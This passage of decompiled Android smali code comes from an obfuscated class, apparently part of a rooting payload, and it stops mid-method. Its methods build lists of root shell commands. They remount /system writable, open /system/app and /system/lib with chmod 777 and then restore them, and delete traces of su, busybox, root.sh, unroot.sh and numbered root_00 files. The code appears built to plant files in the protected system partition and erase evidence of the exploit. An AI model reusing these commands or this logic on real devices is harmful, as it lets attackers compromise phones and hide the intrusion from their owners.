.method private a(I)V
    .registers 2

    return-void
.end method

.method private a(Ljava/util/List;)V
    .registers 6

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "rm "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "rm "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ".zip"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "rm "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "rm "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/su"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "rm "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/busybox"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "rm "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/root.sh"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "rm "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/unroot.sh"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/4 v0, 0x0

    :goto_cf
    const/16 v1, 0xa

    if-lt v0, v1, :cond_fa

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "rm "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/.root"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    sget-object v0, Lcom/test/NewC;->e:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_f3
    :goto_f3
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_11b

    return-void

    :cond_fa
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/root_00"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {p1, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    add-int/lit8 v0, v0, 0x1

    goto :goto_cf

    :cond_11b
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, La/a/e/f;->b(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_f3

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "rm "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_f3
.end method

.method private a(Ljava/lang/String;)Z
    .registers 5

    const/4 v0, 0x0

    invoke-static {p1}, La/a/e/f;->a(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_8

    :cond_7
    :goto_7
    return v0

    :cond_8
    sget-object v1, Lcom/test/NewC;->i:Ljava/util/Set;

    invoke-interface {v1, p1}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

    iget-object v1, p0, Lcom/test/NewC;->m:La/a/a;

    sget-object v2, Lcom/test/NewC;->i:Ljava/util/Set;

    invoke-static {v1, v2}, La/a/e/a;->a(La/a/a;Ljava/util/Set;)Z

    move-result v1

    if-eqz v1, :cond_7

    const/4 v0, 0x1

    goto :goto_7
.end method

.method private a(Ljava/lang/String;I)Z
    .registers 9

    const/4 v1, 0x1

    const/4 v0, 0x0

    invoke-static {p1}, La/a/e/f;->a(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_9

    :cond_8
    :goto_8
    return v0

    :cond_9
    iget-object v2, p0, Lcom/test/NewC;->m:La/a/a;

    invoke-static {v2, p1}, La/a/e/a;->a(La/a/a;Ljava/lang/String;)Landroid/content/pm/ApplicationInfo;

    move-result-object v2

    if-eqz v2, :cond_8

    iget-object v3, v2, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-static {v3}, La/a/e/f;->a(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_8

    iget-object v3, v2, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-static {v3}, La/a/e/f;->b(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3d

    iget-object v3, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v4, "RtLib"

    invoke-virtual {v3, v4, v0}, La/a/a;->a(Ljava/lang/String;I)La/a/b/a;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "packageName"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    iget-object v5, v2, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v3, v4, v5}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    :cond_3d
    iget-object v3, p0, Lcom/test/NewC;->m:La/a/a;

    iget-object v4, v2, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-static {v3, v4}, La/a/e/a;->b(La/a/a;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_49

    move v0, v1

    goto :goto_8

    :cond_49
    iget-object v2, v2, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-direct {p0, v2}, Lcom/test/NewC;->a(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_8

    move v0, v1

    goto :goto_8
.end method

.method private b()V
    .registers 7

    const/4 v5, 0x0

    const/4 v1, 0x0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ".zip"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/su"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/busybox"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/root.sh"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/unroot.sh"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    move v0, v1

    :goto_d1
    const/16 v2, 0xa

    if-lt v0, v2, :cond_fc

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/.root"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    sget-object v0, Lcom/test/NewC;->e:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_f5
    :goto_f5
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_11d

    return-void

    :cond_fc
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "rm "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/root_00"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    add-int/lit8 v0, v0, 0x1

    goto :goto_d1

    :cond_11d
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, La/a/e/f;->b(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_f5

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "rm "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    goto :goto_f5
.end method

.method private b(Ljava/util/List;)V
    .registers 4

    const-string v0, "mount -r -w -o remount /system"

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "/busybox mount -o remount,rw /system"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v0, "mount -o remount,rw /system"

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v0, "chmod 777 /system/app"

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v0, "chmod 777 /system/lib"

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    return-void
.end method

.method private b(Ljava/lang/String;)Z
    .registers 9

    const/4 v3, 0x0

    const/4 v0, 0x0

    invoke-static {p1}, La/a/e/f;->a(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_9

    :cond_8
    :goto_8
    return v0

    :cond_9
    const/4 v4, 0x0

    :try_start_a
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "mount"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_13
    .catch Ljava/lang/Throwable; {:try_start_a .. :try_end_13} :catch_a9
    .catchall {:try_start_a .. :try_end_13} :catchall_8c

    move-result-object v2

    :try_start_14
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-virtual {v2}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    :cond_22
    :goto_22
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v5

    if-nez v5, :cond_38

    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I
    :try_end_2b
    .catch Ljava/lang/Throwable; {:try_start_14 .. :try_end_2b} :catch_78
    .catchall {:try_start_14 .. :try_end_2b} :catchall_a7

    if-eqz v3, :cond_30

    :try_start_2d
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V
    :try_end_30
    .catch Ljava/lang/Exception; {:try_start_2d .. :try_end_30} :catch_a5

    :cond_30
    :goto_30
    if-eqz v2, :cond_8

    :try_start_32
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
    :try_end_35
    .catch Ljava/lang/Exception; {:try_start_32 .. :try_end_35} :catch_36

    goto :goto_8

    :catch_36
    move-exception v1

    goto :goto_8

    :cond_38
    if-eqz v5, :cond_22

    :try_start_3a
    const-string v6, " /system "

    invoke-virtual {v5, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v6

    if-lez v6, :cond_6e

    const-string v1, ""

    invoke-static {v1, v5}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {p1}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/regex/Matcher;->find()Z
    :try_end_52
    .catch Ljava/lang/Throwable; {:try_start_3a .. :try_end_52} :catch_78
    .catchall {:try_start_3a .. :try_end_52} :catchall_a7

    move-result v1

    if-eqz v1, :cond_61

    if-eqz v3, :cond_5a

    :try_start_57
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V
    :try_end_5a
    .catch Ljava/lang/Exception; {:try_start_57 .. :try_end_5a} :catch_99

    :cond_5a
    :goto_5a
    if-eqz v2, :cond_5f

    :try_start_5c
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
    :try_end_5f
    .catch Ljava/lang/Exception; {:try_start_5c .. :try_end_5f} :catch_9b

    :cond_5f
    :goto_5f
    const/4 v0, 0x1

    goto :goto_8

    :cond_61
    if-eqz v3, :cond_66

    :try_start_63
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V
    :try_end_66
    .catch Ljava/lang/Exception; {:try_start_63 .. :try_end_66} :catch_9d

    :cond_66
    :goto_66
    if-eqz v2, :cond_8

    :try_start_68
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
    :try_end_6b
    .catch Ljava/lang/Exception; {:try_start_68 .. :try_end_6b} :catch_6c

    goto :goto_8

    :catch_6c
    move-exception v1

    goto :goto_8

    :cond_6e
    :try_start_6e
    iget-boolean v6, p0, Lcom/test/NewC;->p:Z

    if-eqz v6, :cond_22

    const-string v6, ""

    invoke-static {v6, v5}, La/a/e/e;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_77
    .catch Ljava/lang/Throwable; {:try_start_6e .. :try_end_77} :catch_78
    .catchall {:try_start_6e .. :try_end_77} :catchall_a7

    goto :goto_22

    :catch_78
    move-exception v1

    :goto_79
    :try_start_79
    const-string v5, ""

    invoke-static {v5, v1}, La/a/e/e;->b(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_7e
    .catchall {:try_start_79 .. :try_end_7e} :catchall_a7

    if-eqz v3, :cond_83

    :try_start_80
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V
    :try_end_83
    .catch Ljava/lang/Exception; {:try_start_80 .. :try_end_83} :catch_9f

    :cond_83
    :goto_83
    if-eqz v2, :cond_8

    :try_start_85
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
    :try_end_88
    .catch Ljava/lang/Exception; {:try_start_85 .. :try_end_88} :catch_89

    goto :goto_8

    :catch_89
    move-exception v1

    goto/16 :goto_8

    :catchall_8c
    move-exception v0

    move-object v2, v3

    :goto_8e
    if-eqz v3, :cond_93

    :try_start_90
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V
    :try_end_93
    .catch Ljava/lang/Exception; {:try_start_90 .. :try_end_93} :catch_a1

    :cond_93
    :goto_93
    if-eqz v2, :cond_98

    :try_start_95
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
    :try_end_98
    .catch Ljava/lang/Exception; {:try_start_95 .. :try_end_98} :catch_a3

    :cond_98
    :goto_98
    throw v0

    :catch_99
    move-exception v0

    goto :goto_5a

    :catch_9b
    move-exception v0

    goto :goto_5f

    :catch_9d
    move-exception v1

    goto :goto_66

    :catch_9f
    move-exception v1

    goto :goto_83

    :catch_a1
    move-exception v1

    goto :goto_93

    :catch_a3
    move-exception v1

    goto :goto_98

    :catch_a5
    move-exception v1

    goto :goto_30

    :catchall_a7
    move-exception v0

    goto :goto_8e

    :catch_a9
    move-exception v1

    move-object v2, v3

    goto :goto_79
.end method

.method private c(Ljava/util/List;)V
    .registers 4

    const-string v0, "chmod 755 /system/app"

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v0, "chmod 755 /system/lib"

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const-string v0, "mount -r -o remount /system"

    invoke-interface {p1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

